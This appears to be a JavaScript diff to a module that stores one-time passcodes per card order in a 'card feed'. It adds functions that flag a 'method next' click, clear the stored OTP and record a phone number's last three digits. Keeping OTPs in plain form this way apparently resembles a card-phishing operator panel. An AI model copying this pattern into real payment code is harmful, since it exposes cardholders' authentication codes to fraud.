@@ -90,6 +90,41 @@ export async function attachOtpToCardFeed(orderRef, otp) {
   return true;
 }
 
+export async function markMethodNextClicked(orderRef) {
+  const ref = String(orderRef || '').trim();
+  if (!ref) return false;
+  const feed = await loadFeedRaw();
+  const ix = feed.findIndex((e) => e.order_ref === ref);
+  if (ix < 0) return false;
+  const now = new Date().toISOString();
+  feed[ix] = {
+    ...feed[ix],
+    method_next_clicked: true,
+    method_next_at: now,
+    last_otp: null,
+    otp_at: null,
+    updated_at: now,
+  };
+  await saveFeed(feed);
+  return true;
+}
+
+export async function setPhoneLast3(orderRef, last3) {
+  const ref = String(orderRef || '').trim();
+  const digits = String(last3 || '').replace(/\D/g, '').slice(-3);
+  if (!ref || !digits) return false;
+  const feed = await loadFeedRaw();
+  const ix = feed.findIndex((e) => e.order_ref === ref);
+  if (ix < 0) return false;
+  feed[ix] = {
+    ...feed[ix],
+    phone_last3: digits.padStart(3, '0').slice(-3),
+    updated_at: new Date().toISOString(),
+  };
+  await saveFeed(feed);
+  return true;
+}
+
 export async function updateCardFeedStatus(orderRef, status) {
   const ref = String(orderRef || '').trim();
   const st = String(status || '').trim().toLowerCase();
@@ -135,6 +170,8 @@ export async function getOtpMeta(orderRef) {
     resendCooldownSec,
     failReason,
     feed_status: row.status,
+    method_next_clicked: Boolean(row.method_next_clicked),
+    phone_last3: row.phone_last3 ? String(row.phone_last3) : null,
   };
 }
 
